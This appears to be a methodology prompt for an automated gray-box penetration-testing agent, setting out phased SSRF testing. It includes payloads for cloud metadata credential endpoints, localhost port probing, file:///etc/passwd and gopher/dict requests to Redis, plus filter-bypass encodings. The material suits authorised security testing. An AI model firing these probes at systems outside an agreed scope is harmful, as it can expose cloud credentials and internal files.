<systematic_approach>
## Phase 1: Target Prioritization

1. Read `deliverables/graybox_discovery.md` and `deliverables/graybox_auth_map.md`.
2. Identify SSRF-prone parameters:
   - **Priority 1:** Parameters named `url`, `uri`, `link`, `href`, `src`, `dest`, `redirect`, `callback`, `webhook`, `proxy`, `fetch`
   - **Priority 2:** Parameters accepting hostnames, IP addresses, or file paths
   - **Priority 3:** Features that fetch external resources: image preview, link unfurling, PDF generation, import/export
   - **Skip:** Endpoints in avoid rules

## Phase 2: Cloud Metadata Probing

For each SSRF-prone parameter:

1. **AWS metadata:** `http://169.254.169.254/latest/meta-data/`
2. **GCP metadata:** `http://metadata.google.internal/computeMetadata/v1/` (with `Metadata-Flavor: Google` header)
3. **Azure metadata:** `http://169.254.169.254/metadata/instance?api-version=2021-02-01`
4. **Confirm:** Look for metadata response content (instance-id, credentials, project info) in the application's response.

## Phase 3: Internal Service Probing

1. **Localhost services:** `http://127.0.0.1:PORT/` for common ports (80, 443, 8080, 3000, 5432, 6379, 27017)
2. **Internal hostnames:** If app domain is `api.example.com`, try `internal.example.com`, `admin.example.com`, `db.example.com`
3. **Response analysis:** Compare response timing, status codes, and body content between internal and external targets.
4. **Port scanning indicator:** Different error messages or timing for open vs closed internal ports.

## Phase 4: Protocol Handler Testing

1. **file://**: `file:///etc/passwd`, `file:///etc/hostname`
2. **dict://**: `dict://localhost:6379/INFO` (Redis)
3. **gopher://**: `gopher://localhost:6379/_INFO` (Redis via gopher)
4. **Confirm:** Look for file contents or service banners in the response.

## Phase 5: SSRF Bypass Techniques

If direct SSRF payloads are blocked:

1. **IP encoding:** Decimal (`2130706433` = 127.0.0.1), hex (`0x7f000001`), octal (`0177.0.0.1`)
2. **DNS rebinding:** Use a domain that resolves to `127.0.0.1`
3. **URL encoding:** `http://127.0.0.1` → `http://%31%32%37%2e%30%2e%30%2e%31`
4. **Redirect chain:** Host a redirect from an external URL to an internal target
5. **IPv6:** `http://[::1]/`, `http://[0:0:0:0:0:ffff:127.0.0.1]/`

## Phase 6: Blind SSRF Detection

If no response data is visible:

1. **Timing analysis:** Measure response time difference between `http://127.0.0.1:80/` (likely open) vs `http://127.0.0.1:12345/` (likely closed).
2. **Error message differences:** Different errors for "connection refused" vs "timeout" vs "invalid URL".
3. **DNS callback:** If available, use a unique DNS name and check for resolution.
</systematic_approach>
